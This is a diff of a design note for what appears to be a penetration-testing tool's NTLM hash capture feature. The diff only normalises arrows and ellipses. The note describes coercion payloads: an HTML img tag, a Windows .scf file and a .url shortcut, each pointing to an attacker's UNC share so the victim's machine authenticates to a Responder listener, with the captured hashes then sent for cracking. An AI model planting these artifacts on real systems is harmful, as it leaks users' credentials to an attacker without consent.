@@ -92,7 +92,7 @@ Phase 1 waits for victims to resolve a poisoned name. Phase 2 flips it around: h
 victim a small artifact that, when opened or rendered, makes *their* machine authenticate
 to `\\<us>\share\...` over SMB. It's a **coercion vector, not a new capture path** - the
 auth lands in the *same* Responder listener and flows through the identical pipeline:
-`parse_responder_log` → `build_findings` (`netntlm-captured`) → `crack.py` (`netntlmv2`).
+`parse_responder_log` -> `build_findings` (`netntlm-captured`) -> `crack.py` (`netntlmv2`).
 
 **Why not ntlmrelayx relay?** Live relay (authenticate as the victim straight into a
 target service) is powerful but heavy and far more intrusive - a successful relay is
@@ -110,8 +110,8 @@ so **no new `doctor` check**.
 
 ## Formats (v1: html, scf, url - all text; lnk is binary, later)
 - **html** - `<img src="\\host\share\x.jpg">` (email / web page / CSS body). Default.
-- **scf** - Windows Explorer `.scf` (`[Shell]…IconFile=\\host\share\x.ico`); fires on folder view.
-- **url** - `.url` `[InternetShortcut]` with `IconFile=\\host\…`.
+- **scf** - Windows Explorer `.scf` (`[Shell]...IconFile=\\host\share\x.ico`); fires on folder view.
+- **url** - `.url` `[InternetShortcut]` with `IconFile=\\host\...`.
 - **lnk** - `.lnk` shortcut with a UNC icon; binary and fiddlier, **deferred to a later pass**.
 
 ## Capture: run `poison` normally
